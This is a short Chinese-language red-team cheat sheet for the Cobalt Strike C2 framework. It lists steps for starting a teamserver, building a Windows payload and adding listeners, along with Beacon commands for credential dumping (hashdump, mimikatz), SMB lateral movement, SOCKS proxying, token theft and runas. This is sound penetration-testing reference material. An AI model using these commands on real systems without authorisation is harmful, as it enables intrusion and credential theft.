# 红队工具

_1 条工具命令_

### Cobalt Strike  `cobaltstrike-tool`
_红队渗透测试框架_

**Step 0**
> 启动团队服务器
_platform: linux_
```
./teamserver ip password [C2配置文件]
```

**Step 0**
> 生成可执行Payload
```
Attacks -> Packages -> Windows Executable
```

**Step 0**
> 添加监听器
```
Cobalt Strike -> Listeners -> Add
```

**Step 0**
> Beacon常用命令
```
shell whoami
ps
hashdump
mimikatz
```

**Step 0**
> SMB Beacon横向
_platform: windows_
```
beacon> link target_ip
```

**Step 0**
> 启动SOCKS代理
_platform: windows_
```
beacon> socks 1080
```

**Step 0**
> 窃取进程令牌
_platform: windows_
```
beacon> steal_token PID
```

**Step 0**
> 以其他用户运行
_platform: windows_
```
beacon> runas domain\user password command
```

---
